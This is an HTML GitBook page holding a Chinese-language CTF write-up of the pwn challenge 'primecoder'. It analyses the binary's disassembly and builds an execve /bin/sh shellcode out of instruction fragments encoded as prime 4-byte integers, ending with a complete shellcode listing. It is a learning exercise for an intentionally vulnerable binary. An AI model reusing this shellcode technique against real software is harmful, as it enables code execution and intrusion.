
<!DOCTYPE HTML>
<html lang="" >
    <head>
        <meta charset="UTF-8">
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <title>primecoder · GitBook</title>
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="description" content="">
        <meta name="generator" content="GitBook 3.2.3">
        
        
        
    
    <link rel="stylesheet" href="../gitbook/style.css">

    
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-highlight/website.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search/search.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-fontsettings/website.css">
                
            
        

    

    
        
    
        
    
        
    
        
    
        
    
        
    

        
    
    
    <meta name="HandheldFriendly" content="true"/>
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../gitbook/images/apple-touch-icon-precomposed-152.png">
    <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">

    
    <link rel="next" href="stack1.html" />
    
    
    <link rel="prev" href="hard_stack.html" />
    

    </head>
    <body>
        
<div class="book">
    <div class="book-summary">
        
            
<div id="book-search-input" role="search">
    <input type="text" placeholder="Type to search" />
</div>

            
                <nav role="navigation">
                


<ul class="summary">
    
    

    

    
        
        
    
        <li class="chapter " data-level="1.1" data-path="../">
            
                <a href="../">
            
                    
                    Introduction
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2" data-path="../CRYPTO/">
            
                <a href="../CRYPTO/">
            
                    
                    CRYPTO
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.2.1" data-path="../CRYPTO/rsa.html">
            
                <a href="../CRYPTO/rsa.html">
            
                    
                    rsa
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.2" data-path="../CRYPTO/rsa05.html">
            
                <a href="../CRYPTO/rsa05.html">
            
                    
                    rsa05
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.3" data-path="./">
            
                <a href="./">
            
                    
                    pwn
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.3.1" data-path="一些libc工具.html">
            
                <a href="一些libc工具.html">
            
                    
                    一些libc工具
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.2" data-path="int.html">
            
                <a href="int.html">
            
                    
                    int
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.3" data-path="pointy.html">
            
                <a href="pointy.html">
            
                    
                    pointy
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.4" data-path="guessing_game_1.html">
            
                <a href="guessing_game_1.html">
            
                    
                    guessing_game_1.md
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.5" data-path="hard_stack.html">
            
                <a href="hard_stack.html">
            
                    
                    hard_stack
            
                </a>
            

            
        </li>
    
        <li class="chapter active" data-level="1.3.6" data-path="primecoder.html">
            
                <a href="primecoder.html">
            
                    
                    primecoder
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.7" data-path="stack1.html">
            
                <a href="stack1.html">
            
                    
                    stack1
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.4" data-path="../RE/">
            
                <a href="../RE/">
            
                    
                    RE
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.4.1" data-path="../RE/VaultDoor.html">
            
                <a href="../RE/VaultDoor.html">
            
                    
                    VaultDoor
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.2" data-path="../RE/Checkpass.html">
            
                <a href="../RE/Checkpass.html">
            
                    
                    Checkpass
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.3" data-path="../RE/Powershelly.html">
            
                <a href="../RE/Powershelly.html">
            
                    
                    Powershelly
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.4" data-path="../RE/arm调试——re&pwn.html">
            
                <a href="../RE/arm调试——re&pwn.html">
            
                    
                    arm调试————re&pwn
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.5" data-path="../Web/">
            
                <a href="../Web/">
            
                    
                    Web
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.5.1" data-path="../Web/BabyExtract.html">
            
                <a href="../Web/BabyExtract.html">
            
                    
                    BabyExtract
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.2" data-path="../Web/BabyHttp.html">
            
                <a href="../Web/BabyHttp.html">
            
                    
                    BabyHttp
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.3" data-path="../Web/easySQL0.html">
            
                <a href="../Web/easySQL0.html">
            
                    
                    easySQL0
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

    

    <li class="divider"></li>

    <li>
        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
            Published with GitBook
        </a>
    </li>
</ul>


                </nav>
            
        
    </div>

    <div class="book-body">
        
            <div class="body-inner">
                
                    

<div class="book-header" role="navigation">
    

    <!-- Title -->
    <h1>
        <i class="fa fa-circle-o-notch fa-spin"></i>
        <a href=".." >primecoder</a>
    </h1>
</div>




                    <div class="page-wrapper" tabindex="-1" role="main">
                        <div class="page-inner">
                            
<div id="book-search-results">
    <div class="search-noresults">
    
                                <section class="normal markdown-section">
                                
                                <h2 id="&#x5927;&#x81F4;&#x5206;&#x6790;&#x68C0;&#x67E5;">&#x5927;&#x81F4;&#x5206;&#x6790;&#x68C0;&#x67E5;</h2>
<p>&#x5148;&#x8D70;&#x4E00;&#x904D;&#x6D41;&#x7A0B;&#xFF1A;checksec  ida </p>
<pre><code>&#x250C;&#x2500;&#x2500;(kali&#x327F;helloeveryone)-[~/ctf/pwn/q31_primecoder]
&#x2514;&#x2500;$ checksec primecoder
[*] &apos;/home/kali/ctf/pwn/q31_primecoder/primecoder&apos;
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x400000)
    Stack:    Executable
    RWX:      Has RWX segments
    FORTIFY:  Enabled
</code></pre><p>&#x5728;ida&#x91CC;F5&#x5931;&#x6548;&#xFF0C;&#x9501;&#x5B9A;&#x90A3;&#x4E00;&#x884C;&#xFF0C;&#x5206;&#x6790;&#x6C47;&#x7F16;</p>
<pre><code class="lang-nasm">    call rbp
</code></pre>
<p>&#x7ED3;&#x5408;&#x4E0A;&#x4E0B;&#x6587;&#x6765;&#x770B;&#xFF0C;&#x5E94;&#x8BE5;&#x662F;&#x8981;&#x5728;rbp&#x5904;&#x6267;&#x884C;shellcode</p>
<h2 id="&#x7A0B;&#x5E8F;&#x6D41;&#x7A0B;&#x5206;&#x6790;">&#x7A0B;&#x5E8F;&#x6D41;&#x7A0B;&#x5206;&#x6790;</h2>
<p>&#x9996;&#x5148;&#x5E94;&#x6E05;&#x695A;linux-amd64&#x8C03;&#x7528;&#x51FD;&#x6570;&#x4F20;&#x53C2;&#x7EA6;&#x5B9A;</p>
<h3 id="&#x5165;&#x53C2;">&#x5165;&#x53C2;</h3>
<ul>
<li>&#x5728;&#x53C2;&#x6570;&#x90FD;&#x662F;&#x5C0F;&#x4E8E;&#x7B49;&#x4E8E; 16 &#x5B57;&#x8282;&#x7684;&#x6574;&#x6570;/&#x679A;&#x4E3E;/&#x7ED3;&#x6784;&#x4F53;&#x65F6;&#xFF0C;&#x524D;&#x516D;&#x4E2A;&#x53C2;&#x6570;&#x5206;&#x522B;&#x7531; <strong>RDI&#x3001;RSI&#x3001;RDX&#x3001;RCX&#x3001;R8&#x3001;R9</strong> <strong><em>&#xFF08;&#x8FD9;&#x90E8;&#x5206;&#x662F;&#x91CD;&#x70B9;&#xFF0C;&#x6709;&#x52A9;&#x4E8E;&#x770B;&#x61C2;&#x672C;&#x9898;&#x6D89;&#x53CA;&#x4EE3;&#x7801;&#xFF09;</em></strong> &#x4F20;&#x9012;&#xFF08;&#x8D85;&#x8FC7; 8 &#x5B57;&#x8282;&#x7684;&#x7528;&#x8FDE;&#x7EED;&#x7684;&#x4E24;&#x4E2A;&#x5BC4;&#x5B58;&#x5668;&#xFF09;&#xFF0C;&#x5269;&#x4E0B;&#x7684;&#x53C2;&#x6570;&#x7528;&#x6808;&#x4F20;&#x9012;&#xFF08;&#x53C2;&#x6570;&#x5728;&#x5185;&#x5B58;&#x4E2D;&#x7684;&#x76F8;&#x5BF9;&#x4F4D;&#x7F6E;&#x6070;&#x597D;&#x548C;&#x53C2;&#x6570;&#x5B9E;&#x9645;&#x4F4D;&#x7F6E;&#x4E00;&#x81F4;&#xFF09;&#x3002;&#x5C0F;&#x4E8E; 64 &#x4F4D;&#x7684;&#x503C;&#x5360;&#x7528;&#x5BC4;&#x5B58;&#x5668;&#x7684;&#x4F4E;&#x4F4D;&#xFF0C;&#x9AD8;&#x4F4D;&#x6570;&#x636E;&#x65E0;&#x6548;&#x3002;</li>
<li>&#x5728;&#x53C2;&#x6570;&#x90FD;&#x662F;&#x6D6E;&#x70B9;&#x65F6;&#xFF0C;&#x5927;&#x81F4;&#x548C;&#x524D;&#x9762;&#x4E00;&#x6837;&#xFF0C;&#x4E0D;&#x540C;&#x7684;&#x662F;&#x524D;&#x516B;&#x4E2A;&#x53C2;&#x6570;&#x7528;&#x7684;&#x5BC4;&#x5B58;&#x5668;&#x662F; xmm0&#xFF5E;xmm7&#x3002;</li>
<li>&#x5982;&#x679C;&#x662F;&#x6574;&#x5F62;&#x548C;&#x6D6E;&#x70B9;&#x6DF7;&#x7528;&#xFF0C;&#x90A3;&#x4E48;&#x4F9D;&#x6B21;&#x7528;&#x6574;&#x5F62;&#x5BC4;&#x5B58;&#x5668;&#x548C;&#x6D6E;&#x70B9;&#x5BC4;&#x5B58;&#x5668;&#x4F20;&#x9012;&#xFF0C;&#x76F4;&#x5230;&#x628A;&#x8FD9; 6+8 &#x4E2A;&#x5BC4;&#x5B58;&#x5668;&#x7528;&#x5B8C;&#x4E3A;&#x6B62;&#x3002;</li>
<li>&#x5728;&#x53C2;&#x6570;&#x5B58;&#x5728;&#x5927;&#x4E8E; 16 &#x5B57;&#x8282;&#x7684;&#x7ED3;&#x6784;&#x4F53;&#x662F;&#x76F4;&#x63A5;&#x7528;&#x6808;&#x4F20;&#x9012;&#x3002;</li>
</ul>
<h3 id="&#x8FD4;&#x56DE;&#x503C;">&#x8FD4;&#x56DE;&#x503C;</h3>
<ul>
<li>&#x88AB;&#x8C03;&#x7528;&#x51FD;&#x6570;&#x7684;&#x8FD4;&#x56DE;&#x503C;&#x662F;64&#x4F4D;&#x4EE5;&#x5185;&#xFF08;&#x5305;&#x62EC;64&#x4F4D;&#xFF09;&#x7684;&#x6574;&#x5F62;&#x6216;&#x6307;&#x9488;&#x65F6;&#xFF0C;&#x5219;&#x8FD4;&#x56DE;&#x503C;&#x4F1A;&#x88AB;&#x5B58;&#x653E;&#x4E8E; RAX&#xFF0C;&#x5982;&#x679C;&#x8FD4;&#x56DE;&#x503C;&#x662F;128&#x4F4D;&#x7684;&#xFF0C;&#x5219;&#x9AD8;64&#x4F4D;&#x653E;&#x5165; RDX&#xFF1B;</li>
<li>&#x5982;&#x679C;&#x8FD4;&#x56DE;&#x503C;&#x662F;&#x6D6E;&#x70B9;&#x503C;&#xFF0C;&#x5219;&#x8FD4;&#x56DE;&#x503C;&#x5B58;&#x653E;&#x5728;XMM0&#xFF1B;</li>
<li>&#x66F4;&#x5927;&#x7684;&#x8FD4;&#x56DE;&#x503C;(&#x6BD4;&#x5982;&#x7ED3;&#x6784;&#x4F53;)&#xFF0C;&#x7531;&#x8C03;&#x7528;&#x65B9;&#x5728;&#x6808;&#x4E0A;&#x5206;&#x914D;&#x7A7A;&#x95F4;&#xFF0C;&#x5E76;&#x7531; RCX &#x6301;&#x6709;&#x8BE5;&#x7A7A;&#x95F4;&#x7684;&#x6307;&#x9488;&#x5E76;&#x4F20;&#x9012;&#x7ED9;&#x88AB;&#x8C03;&#x7528;&#x51FD;&#x6570;&#xFF0C;&#x56E0;&#x6B64;&#x6574;&#x578B;&#x53C2;&#x6570;&#x4F7F;&#x7528;&#x7684;&#x5BC4;&#x5B58;&#x5668;&#x4F9D;&#x6B21;&#x53F3;&#x79FB;&#x4E00;&#x683C;&#xFF0C;&#x5B9E;&#x9645;&#x53EA;&#x53EF;&#x4EE5;&#x5229;&#x7528; RDI&#xFF0C;RSI&#xFF0C;RDX&#xFF0C;R8&#xFF0C;R9&#xFF0C;5&#x4E2A;&#x5BC4;&#x5B58;&#x5668;&#xFF0C;&#x5176;&#x4F59;&#x53C2;&#x6570;&#x901A;&#x8FC7;&#x6808;&#x4F20;&#x9012;&#x3002;&#x51FD;&#x6570;&#x8C03;&#x7528;&#x7ED3;&#x675F;&#x540E;&#xFF0C;RAX &#x8FD4;&#x56DE;&#x8BE5;&#x7A7A;&#x95F4;&#x7684;&#x6307;&#x9488;&#xFF08;&#x5373;&#x51FD;&#x6570;&#x8C03;&#x7528;&#x5F00;&#x59CB;&#x65F6;&#x7684; RCX &#x503C;&#xFF09;&#x3002;</li>
</ul>
<h3 id="&#x6B63;&#x5F0F;&#x5206;&#x6790;">&#x6B63;&#x5F0F;&#x5206;&#x6790;</h3>
<pre><code class="lang-nasm">.text:0000000000400560 ; int __cdecl main(int argc, const char **argv, const char **envp)
.text:0000000000400560                 public main
.text:0000000000400560 main            proc near               ; DATA XREF: _start+1D&#x2193;o
.text:0000000000400560
.text:0000000000400560 var_42C         = dword ptr -42Ch
.text:0000000000400560 var_41C         = qword ptr -41Ch
.text:0000000000400560
.text:0000000000400560 ; __unwind {
.text:0000000000400560                 push    r12
.text:0000000000400562                 push    rbp
.text:0000000000400563                 xor     ecx, ecx        ; n
.text:0000000000400565                 push    rbx
.text:0000000000400566                 mov     edx, 2          ; modes
.text:000000000040056B                 xor     esi, esi        ; buf
.text:000000000040056D                 xor     ebx, ebx
.text:000000000040056F                 sub     rsp, 420h
.text:0000000000400576                 mov     rdi, cs:stdin@@GLIBC_2_2_5 ; stream
.text:000000000040057D                 lea     rbp, [rsp+32]
.text:0000000000400582                 lea     r12, [rsp+28]
.text:0000000000400587                 call    _setvbuf
.text:000000000040058C                 mov     rdi, cs:__bss_start ; stream
.text:0000000000400593                 xor     ecx, ecx        ; n
.text:0000000000400595                 mov     edx, 2          ; modes
.text:000000000040059A                 xor     esi, esi        ; buf
.text:000000000040059C                 call    _setvbuf
.text:00000000004005A1                 lea     rsi, aBufferP   ; &quot;buffer = %p.\n&quot;
.text:00000000004005A8                 mov     rdx, rbp
.text:00000000004005AB                 mov     edi, 1
.text:00000000004005B0                 xor     eax, eax
.text:00000000004005B2                 call    ___printf_chk
.text:00000000004005B7
.text:00000000004005B7 loc_4005B7:                             ; CODE XREF: main+BF&#x2193;j
.text:00000000004005B7                 lea     rdi, format     ; &quot;%u&quot;
.text:00000000004005BE                 xor     eax, eax
.text:00000000004005C0                 mov     rsi, r12
.text:00000000004005C3                 call    _scanf
.text:00000000004005C8                 inc     eax
.text:00000000004005CA                 cmp     eax, 1
.text:00000000004005CD                 jbe     short loc_400621
.text:00000000004005CF                 mov     edi, [rsp+28]   ; __int64
.text:00000000004005D3                 mov     [rsp+12], edi
.text:00000000004005D7                 call    _Z6millerx      ; miller(long long)
.text:00000000004005DC                 test    al, al
.text:00000000004005DE                 mov     edx, [rsp+12]   ; edx&#x4E3A;input
.text:00000000004005E2                 jz      short loc_400606
.text:00000000004005E4                 lea     rsi, aGoodUIsPrime ; &quot;Good! %u is prime.\n&quot;
.text:00000000004005EB                 mov     edi, 1
.text:00000000004005F0                 xor     eax, eax
.text:00000000004005F2                 call    ___printf_chk
.text:00000000004005F7                 mov     edx, [rsp+28]
.text:00000000004005FB                 movsxd  rax, ebx
.text:00000000004005FE                 inc     ebx             ; &#x5FAA;&#x73AF;&#x6B21;&#x6570;
.text:0000000000400600                 mov     [rsp+rax*4+32], edx ; &#x7B2C;&#x4E00;&#x6B21;rax=1
.text:0000000000400604                 jmp     short loc_400619
.text:0000000000400606 ; ---------------------------------------------------------------------------
.text:0000000000400606
.text:0000000000400606 loc_400606:                             ; CODE XREF: main+82&#x2191;j
.text:0000000000400606                 lea     rsi, aBadUIsNotPrime ; &quot;Bad! %u is not prime.\n&quot;
.text:000000000040060D                 mov     edi, 1
.text:0000000000400612                 xor     eax, eax
.text:0000000000400614                 call    ___printf_chk
.text:0000000000400619
.text:0000000000400619 loc_400619:                             ; CODE XREF: main+A4&#x2191;j
.text:0000000000400619                 cmp     ebx, 255
.text:000000000040061F                 jle     short loc_4005B7
.text:0000000000400621
.text:0000000000400621 loc_400621:                             ; CODE XREF: main+6D&#x2191;j
.text:0000000000400621                 call    rbp
.text:0000000000400623                 add     rsp, 1056
.text:000000000040062A                 xor     eax, eax
.text:000000000040062C                 pop     rbx
.text:000000000040062D                 pop     rbp
.text:000000000040062E                 pop     r12
.text:0000000000400630                 retn
.text:0000000000400630 ; } // starts at 400560
.text:0000000000400630 main            endp
</code></pre>
<p>&#x5148;&#x89C2;&#x5BDF;rbp&#xFF0C;&#x5176;&#x6700;&#x540E;&#x4E00;&#x6B21;&#x88AB;&#x6539;&#x53D8;&#x662F;&#x5728; <code>0x000000000040057D</code> &#xFF0C;</p>
<pre><code class="lang-nasm">lea     rbp, [rsp+32]
</code></pre>
<p>&#x8FD9;&#x4E5F;&#x662F;&#x5C06;buffer&#x7684;&#x5730;&#x5740;&#x52A0;&#x8F7D;&#x5230;rbp&#x91CC;</p>
<p>&#x518D;&#x7EE7;&#x7EED;&#x5206;&#x6790;&#x6D41;&#x7A0B;&#xFF0C;<code>_scanf</code> &#x8BFB;&#x5165;&#x4E00;&#x4E2A;4&#x5B57;&#x8282;&#x65E0;&#x7B26;&#x53F7;&#x6574;&#x6570;&#x5230;rsi&#x5BC4;&#x5B58;&#x5668;&#x4E2D;&#x5B58;&#x50A8;&#x7684;&#x5730;&#x5740;&#xFF0C;&#x5373;&#x4E0A;&#x4E00;&#x6B65;r12&#x7684;&#x5730;&#x5740;&#xFF08;&#x6D89;&#x53CA;&#x7684;&#x4EE3;&#x7801;&#x5982;&#x4E0B;&#xFF09;&#xFF0C;</p>
<pre><code class="lang-nasm">lea     r12, [rsp+28]
...
mov     rsi, r12
</code></pre>
<p>&#x82E5;&#x8F93;&#x5165;&#x975E;&#x7A7A;&#x5219;&#x5C06;&#x90A3;&#x4E2A;&#x6570;&#x4F20;&#x7ED9;edi&#x548C;&#x5730;&#x5740; <code>[rsp+12]</code> &#xFF0C;&#x5E76;&#x4EE3;&#x5165;&#x51FD;&#x6570; <code>_Z6millerx</code> &#x505A;&#x5224;&#x65AD;&#x3002;&#x5224;&#x65AD;&#x6210;&#x529F;&#x5219;&#x628A;&#x90A3;&#x4E2A;&#x6570;&#x4F20;&#x7ED9;edx&#x5E76;&#x5199;&#x5165; <code>[rsp+rax*4+32]</code> &#xFF0C;&#x5373;buffer</p>
<p>&#x603B;&#x7ED3;&#x4E00;&#x4E0B;&#xFF0C;&#x5373;&#x53EA;&#x6709;&#x88AB;&#x8BE5;&#x7A0B;&#x5E8F;&#x5224;&#x5B9A;&#x4E3A;&#x8D28;&#x6570;&#x7684;4&#x5B57;&#x8282;&#x65E0;&#x7B26;&#x53F7;&#x6574;&#x6570;&#x624D;&#x80FD;&#x88AB;&#x5B58;&#x5165;buffer&#x5E76;&#x5728;&#x8F93;&#x5165;&#x4E3A;&#x7A7A;&#x540E;&#x88AB;&#x6267;&#x884C;&#xFF0C;&#x5373;&#x6211;&#x4EEC;&#x5F97;&#x8BA9;shellcode&#x53EF;&#x4EE5;&#x88AB;&#x5206;&#x6210;&#x8BB8;&#x591A;4&#x5B57;&#x8282;&#x8D28;&#x6570;&#x8F93;&#x5165;&#x5185;&#x5B58;&#x3002;</p>
<h2 id="&#x6784;&#x9020;shellcode">&#x6784;&#x9020;shellcode</h2>
<p>&#x6709;&#x7528;&#x7684;&#x7F51;&#x7AD9;&#xFF1A;</p>
<ul>
<li><a href="https://defuse.ca/online-x86-assembler.htm#disassembly" target="_blank">Online x86 / x64 Assembler and Disassembler</a></li>
</ul>
<p>&#x8981;&#x7528;syscall&#x8C03;&#x7528;shell&#xFF0C;&#x5404;&#x4E2A;&#x5BC4;&#x5B58;&#x5668;&#x7684;&#x503C;&#x5E94;&#x662F;&#xFF1A;</p>
<ul>
<li>rax : 0x3b (&#x7CFB;&#x7EDF;&#x8C03;&#x7528;&#x53F7;)</li>
<li>rdi : rsp&#x7684;&#x5730;&#x5740; (&#x5148;&#x8981;&#x628A;/bin//sh&#x538B;&#x5165;&#x6808;&#x9876;)</li>
<li>rdx : 0</li>
<li>rsi : 0</li>
</ul>
<p>&#x53EF;&#x4EE5;&#x8003;&#x8651;&#x5C06;shellcode&#x5206;&#x89E3;&#x6210;&#x4E00;&#x7CFB;&#x5217;&#x5C0F;&#x7247;&#x6BB5;&#xFF0C;&#x8F83;&#x5C11;&#x8FDE;&#x7EED;&#x6027;&#xFF0C;&#x6613;&#x4E8E;&#x5F62;&#x6210;&#x8D28;&#x6570;&#x3002;</p>
<ul>
<li>&#x6CE8;&#x610F;&#xFF1A;&#x7A0B;&#x5E8F;&#x4E3A;&#x5C0F;&#x7AEF;&#x5E8F;&#xFF0C;shellcode&#x6267;&#x884C;&#x4E5F;&#x662F;&#x4ECE;&#x4F4E;&#x5730;&#x5740;&#x5230;&#x9AD8;&#x5730;&#x5740;&#xFF0C;&#x56E0;&#x6B64;&#x5BF9;&#x5E94;&#x6574;&#x6570;&#x662F;&#x5012;&#x8FC7;&#x6765;&#x770B;&#x7684;</li>
</ul>
<p>&#x4F8B;&#x5982;&#x4E0B;&#x9762;&#xFF1A;</p>
<pre><code class="lang-nasm">    cdq         ;0x99
    push rdx    ;0x52
    cdq         ;0x99
    pop rsi     ;0x5e

    ;&#x5BF9;&#x5E94;&#x7684;&#x5C31;&#x662F;0x5e995299
</code></pre>
<p>&#x4E0B;&#x9762;&#x662F;&#x4F5C;&#x8005;&#x627E;&#x5230;&#x7684;&#x4E00;&#x4E9B;&#x8D28;&#x6570;&#x5BF9;&#x5E94;&#x7684;&#x6C47;&#x7F16;&#x4EE3;&#x7801;&#xFF0C;&#x57FA;&#x672C;&#x8986;&#x76D6;&#x5168;&#x9762;</p>
<pre><code class="lang-nasm">    cdq
    push rdx
    cdq
    pop rsi

    cdq
    xor rax,rax

    cdq
    cdq
    push rdx
    cdq

    cdq
    push rdx
    pop rdi
    push rdx

    pop rdi
    pop rdi
    pop r9

    shl r9,0x20

    cdq
    shr r9,1

    ;2 int
    cdq
    nop
    mov r9d,0x68732f2f

    ;3 int
    pop rdi
    cdq
    nop
    add r9d,0x6e69622f
    cdq
    nop

    ;3
    pop rdi
    mov dl,0x0c
    add r9,0x6e69622f
    cdq
    nop

    cdq
    push r9
    nop

    cdq
    pop r10
    nop

    cdq
    add rdi,r9

    cdq
    push rsp
    mov dl,0x16

    syscall
    mov dl,0x5

    mov bl,0x2
    mov al,0x3b
</code></pre>
<h3 id="&#x5BFB;&#x627E;&#x6280;&#x5DE7;">&#x5BFB;&#x627E;&#x6280;&#x5DE7;</h3>
<ul>
<li>&#x591A;&#x8FD0;&#x7528;&#x5355;&#x5B57;&#x8282;&#x3001;&#x53CC;&#x5B57;&#x8282;&#x7684;&#x5B57;&#x8282;&#x7801;&#xFF0C;&#x5982;:<pre><code class="lang-nasm">cdq       ;0x99
nop       ;0x90
pop rdi   ;0x5f
push r9   ;0x41 0x51
</code></pre>
</li>
<li>&#x5BF9;&#x4E00;&#x4E9B;&#x9700;&#x8981;&#x51D1;&#x6210;&#x4E24;&#x5230;&#x4E09;&#x4E2A;&#x8D28;&#x6570;&#x7684;&#x53EF;&#x4EE5;&#x7528;&#x7279;&#x5B9A;&#x6307;&#x4EE4;&#x8FDB;&#x884C;&#x7206;&#x7834;<pre><code class="lang-nasm">mov dl,0x??   ;0xb2 0x??  ??&#x76F8;&#x540C;
;&#x540C;&#x7406;&#xFF0C;&#x53EF;&#x4EE5;&#x662F;bl&#x7B49;&#xFF0C;&#x4F46;&#x9700;&#x662F;&#x65E0;&#x7528;&#x7684;&#x5BC4;&#x5B58;&#x5668;
</code></pre>
</li>
</ul>
<h3 id="&#x5B8C;&#x6574;shellcode">&#x5B8C;&#x6574;shellcode</h3>
<pre><code class="lang-nasm">    cdq
    push rdx
    cdq
    pop rsi

    cdq
    push rdx
    pop rdi
    push rdx

    cdq
    nop
    mov r9d,0x68732f2f

    cdq
    shr r9,1

    cdq
    shr r9,1

    cdq
    shr r9,1

    cdq
    shr r9,1

    cdq
    shr r9,1

    cdq
    shr r9,1

    cdq
    shr r9,1

    cdq
    shr r9,1

    shl r9,0x20

    pop rdi
    mov dl,0x0c
    add r9,0x6e69622f
    cdq
    nop

    cdq
    push r9
    nop

    cdq
    push rsp
    mov dl,0x16

    pop rdi
    cdq
    nop
    add r9d,0x6e69622f
    cdq
    nop

    cdq
    xor rax,rax

    mov bl,0x2
    mov al,0x3b

    syscall
    mov dl,0x5
</code></pre>

                                
                                </section>
                            
    </div>
    <div class="search-results">
        <div class="has-results">
            
            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
            <ul class="search-results-list"></ul>
            
        </div>
        <div class="no-results">
            
            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
            
        </div>
    </div>
</div>

                        </div>
                    </div>
                
            </div>

            
                
                <a href="hard_stack.html" class="navigation navigation-prev " aria-label="Previous page: hard_stack">
                    <i class="fa fa-angle-left"></i>
                </a>
                
                
                <a href="stack1.html" class="navigation navigation-next " aria-label="Next page: stack1">
                    <i class="fa fa-angle-right"></i>
                </a>
                
            
        
    </div>

    <script>
        var gitbook = gitbook || [];
        gitbook.push(function() {
            gitbook.page.hasChanged({"page":{"title":"primecoder","level":"1.3.6","depth":2,"next":{"title":"stack1","level":"1.3.7","depth":2,"path":"pwn/stack1.md","ref":"pwn/stack1.md","articles":[]},"previous":{"title":"hard_stack","level":"1.3.5","depth":2,"path":"pwn/hard_stack.md","ref":"pwn/hard_stack.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":[],"pluginsConfig":{"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"pwn/primecoder.md","mtime":"2024-06-04T06:04:20.961Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2024-06-26T16:46:22.038Z"},"basePath":"..","book":{"language":""}});
        });
    </script>
</div>

        
    <script src="../gitbook/gitbook.js"></script>
    <script src="../gitbook/theme.js"></script>
    
        
        <script src="../gitbook/gitbook-plugin-search/search-engine.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-search/search.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-sharing/buttons.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
        
    

    </body>
</html>

